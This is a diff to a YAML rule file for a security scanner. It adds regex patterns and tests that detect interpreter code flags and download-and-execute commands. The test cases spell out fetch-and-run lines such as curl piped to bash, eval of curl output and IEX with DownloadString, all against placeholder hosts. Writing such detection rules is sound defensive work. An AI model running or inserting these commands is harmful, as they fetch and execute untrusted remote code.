@@ -66,9 +66,22 @@ rules:
         - '\bsource\s+/dev/stdin'
         - '\bInvoke-Expression\b|\biex\s+'
         - '\bpowershell\b[^\n]*-(?:enc|EncodedCommand)\b'
+        # An interpreter invoked with its code flag. `sh -c`, `python -c`,
+        # `node -e` and `powershell -Command` all take a *string* and run it as
+        # a program, which is the same act as `eval` wearing a process
+        # boundary. Without this, `subprocess.run(["sh", "-c", downloaded])`
+        # labelled only as a process start -- indistinguishable from
+        # `subprocess.run(["git", "status"])`, and the difference is the whole
+        # dropper.
+        - '\b(?:ba|z|k|da)?sh\s+-c\s'
+        - '\bpython[0-9.]{0,4}\s+-c\s'
+        - '\bnode\s+-e\s'
+        - '\b(?:perl|ruby)\s+-e\s'
+        - '\bpowershell\b[^\n]{0,80}-Command\b'
     tests:
       positive:
         - "eval \"$CMD\""
+        - "sh -c \"$PAYLOAD\""
         - "iex (New-Object Net.WebClient).DownloadString($u)"
         - "powershell -enc SQBFAFgA"
       negative:
@@ -269,9 +282,19 @@ rules:
         - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?python[0-9.]*\b'
         - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b'
         - '\b(?:Invoke-WebRequest|iwr|curl)\b[^|\n]{0,200}\|\s*(?:IEX|Invoke-Expression)\b'
+        # The forms with no pipe. `eval "$(curl ...)"` and `IEX (New-Object
+        # Net.WebClient).DownloadString(...)` are the two most recognisable
+        # lines in the literature after `curl | sh`, and matching only the pipe
+        # meant both labelled as a fetch and an execution that happened to
+        # share a file -- which is the weaker claim the composites now refuse.
+        - '\b(?:eval|source)\b[^\n]{0,40}[$]\([^)\n]{0,200}\b(?:curl|wget|fetch)\b'
+        - '\b(?:eval|source|\.)\s[^\n]{0,40}<\([^)\n]{0,200}\b(?:curl|wget|fetch)\b'
+        - '\b(?:IEX|Invoke-Expression)\b[^\n]{0,120}\b(?:DownloadString|DownloadData|DownloadFile)\b'
     tests:
       positive:
         - "curl -sSL https://example.invalid/x | bash"
+        - "eval \"$(curl -fsSL https://example.invalid/i.sh)\""
+        - "IEX (New-Object Net.WebClient).DownloadString($u)"
         - "wget -qO- https://example.invalid/x | sudo sh"
         - "curl https://example.invalid/x | python3"
         - "iwr https://example.invalid/x | IEX"
